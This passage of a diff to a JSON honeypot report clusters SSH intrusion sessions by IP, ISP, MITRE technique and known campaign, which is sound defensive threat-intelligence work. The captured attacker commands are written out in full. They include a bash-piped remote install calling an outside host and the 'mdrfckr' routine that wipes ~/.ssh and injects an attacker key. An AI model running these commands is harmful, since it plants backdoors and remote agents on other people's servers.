+          "timestamp": "2026-08-16T02:46:33.596042Z"
+        },
+        {
+          "session_id": "IR-e30b3fb0c341",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:47:28.352606Z"
+        },
+        {
+          "session_id": "IR-672460192083",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:48:25.249627Z"
+        },
+        {
+          "session_id": "IR-32ba0a83f593",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:49:20.875713Z"
+        },
+        {
+          "session_id": "IR-bff897782992",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:50:16.793709Z"
+        },
+        {
+          "session_id": "IR-a432dbb7ac78",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:51:14.179438Z"
+        },
+        {
+          "session_id": "IR-8662648d101f",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:52:11.880479Z"
+        },
+        {
+          "session_id": "IR-7dd2a4dae931",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:53:09.683149Z"
+        },
+        {
+          "session_id": "IR-f8ddb6fdc5c2",
+          "src_ip": "193.32.162.15",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-16T02:54:10.929709Z"
         }
       ]
     },
@@ -442,7 +1048,235 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 3,
+      "session_count": 1,
+      "unique_ips": [
+        "168.110.102.254"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "d2af147dd3fa2817",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "representative_commands": [
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+      ],
+      "members": [
+        {
+          "session_id": "IR-18b146972ba1",
+          "src_ip": "168.110.102.254",
+          "country": "KR",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-08-16T01:23:43.406203Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 2,
+      "unique_ips": [
+        "157.245.34.56",
+        "20.153.204.5"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "98af0db988d5971c",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+      ],
+      "members": [
+        {
+          "session_id": "IR-d15516ac6c25",
+          "src_ip": "157.245.34.56",
+          "country": "GB",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 2,
+          "timestamp": "2026-08-16T01:20:11.777229Z"
+        },
+        {
+          "session_id": "IR-9a08ffbc11e4",
+          "src_ip": "20.153.204.5",
+          "country": "JP",
+          "isp": "Microsoft Corporation",
+          "command_count": 2,
+          "timestamp": "2026-08-16T02:31:25.347739Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 12,
+      "unique_ips": [
+        "185.74.59.14",
+        "45.142.193.164"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "b55d713e4cae43f9",
+      "ttps": [],
+      "representative_commands": [
+        "echo xsec"
+      ],
+      "members": [
+        {
+          "session_id": "IR-05df38da498f",
+          "src_ip": "45.142.193.164",
+          "country": "NL",
+          "isp": "Limited Network LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-16T00:58:05.318069Z"
+        },
+        {
+          "session_id": "IR-03c198ee9b7b",
+          "src_ip": "185.74.59.14",
+          "country": "IM",
+          "isp": "ELITE GROUP.IM LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-08-16T01:02:31.138148Z"
+        },
+        {
+          "session_id": "IR-3a05f16f9e90",
+          "src_ip": "185.74.59.14",
+          "country": "IM",
+          "isp": "ELITE GROUP.IM LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-08-16T01:14:30.690426Z"
+        },
+        {
+          "session_id": "IR-9b1b4c33897a",
+          "src_ip": "45.142.193.164",
+          "country": "NL",
+          "isp": "Limited Network LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-16T01:20:14.546007Z"
+        },
+        {
+          "session_id": "IR-bada509fec79",
+          "src_ip": "45.142.193.164",
+          "country": "NL",
+          "isp": "Limited Network LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-16T01:42:26.354906Z"
+        },
+        {
+          "session_id": "IR-d192f659a782",
+          "src_ip": "185.74.59.14",
+          "country": "IM",
+          "isp": "ELITE GROUP.IM LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:02:38.561472Z"
+        },
+        {
+          "session_id": "IR-3b7c0e0076cf",
+          "src_ip": "45.142.193.164",
+          "country": "NL",
+          "isp": "Limited Network LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:04:50.247274Z"
+        },
+        {
+          "session_id": "IR-228562cd456a",
+          "src_ip": "185.74.59.14",
+          "country": "IM",
+          "isp": "ELITE GROUP.IM LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:14:36.800112Z"
+        },
+        {
+          "session_id": "IR-3eb16ab79e66",
+          "src_ip": "185.74.59.14",
+          "country": "IM",
+          "isp": "ELITE GROUP.IM LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:26:36.223912Z"
+        },
+        {
+          "session_id": "IR-65ce1dd2ae13",
+          "src_ip": "45.142.193.164",
+          "country": "NL",
+          "isp": "Limited Network LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:27:06.647992Z"
+        },
+        {
+          "session_id": "IR-724e35012f61",
+          "src_ip": "185.74.59.14",
+          "country": "IM",
+          "isp": "ELITE GROUP.IM LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:38:37.118989Z"
+        },
+        {
+          "session_id": "IR-59e078838888",
+          "src_ip": "45.142.193.164",
+          "country": "NL",
+          "isp": "Limited Network LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:49:43.519022Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 7,
       "unique_ips": [
         "217.165.22.192"
       ],
@@ -459,64 +1293,60 @@
       ],
       "members": [
         {
-          "session_id": "IR-848a33e278da",
+          "session_id": "IR-4ecaf4d4d878",
           "src_ip": "217.165.22.192",
           "country": "AE",
           "isp": "Emirates Telecommunications Corporation",
           "command_count": 1,
-          "timestamp": "2026-08-16T00:00:50.946326Z"
+          "timestamp": "2026-08-16T00:58:14.297692Z"
         },
         {
-          "session_id": "IR-7e275aa40afd",
+          "session_id": "IR-f67d841b5f1a",
           "src_ip": "217.165.22.192",
           "country": "AE",
           "isp": "Emirates Telecommunications Corporation",
           "command_count": 1,
-          "timestamp": "2026-08-16T00:19:58.773395Z"
+          "timestamp": "2026-08-16T01:17:22.109414Z"
         },
         {
-          "session_id": "IR-22399914c058",
+          "session_id": "IR-f8d4d0189a95",
           "src_ip": "217.165.22.192",
           "country": "AE",
           "isp": "Emirates Telecommunications Corporation",
           "command_count": 1,
-          "timestamp": "2026-08-16T00:39:06.722252Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "45.142.193.164"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "b55d713e4cae43f9",
-      "ttps": [],
-      "representative_commands": [
-        "echo xsec"
-      ],
-      "members": [
-        {
-          "session_id": "IR-5a273f25201b",
-          "src_ip": "45.142.193.164",
-          "country": "NL",
-          "isp": "Limited Network LTD",
-          "command_count": 1,
-          "timestamp": "2026-08-16T00:12:23.077420Z"
+          "timestamp": "2026-08-16T01:36:29.794072Z"
         },
         {
-          "session_id": "IR-50b831e52973",
-          "src_ip": "45.142.193.164",
-          "country": "NL",
-          "isp": "Limited Network LTD",
+          "session_id": "IR-d72e1858f065",
+          "src_ip": "217.165.22.192",
+          "country": "AE",
+          "isp": "Emirates Telecommunications Corporation",
           "command_count": 1,
-          "timestamp": "2026-08-16T00:35:14.800262Z"
+          "timestamp": "2026-08-16T01:55:37.265594Z"
+        },
+        {
+          "session_id": "IR-84dd63652239",
+          "src_ip": "217.165.22.192",
+          "country": "AE",
+          "isp": "Emirates Telecommunications Corporation",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:14:45.050050Z"
+        },
+        {
+          "session_id": "IR-35c4c46a550d",
+          "src_ip": "217.165.22.192",
+          "country": "AE",
+          "isp": "Emirates Telecommunications Corporation",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:33:52.340610Z"
+        },
+        {
+          "session_id": "IR-6ce16780c05a",
+          "src_ip": "217.165.22.192",
+          "country": "AE",
+          "isp": "Emirates Telecommunications Corporation",
+          "command_count": 1,
+          "timestamp": "2026-08-16T02:52:59.999286Z"
         }
       ]
     }
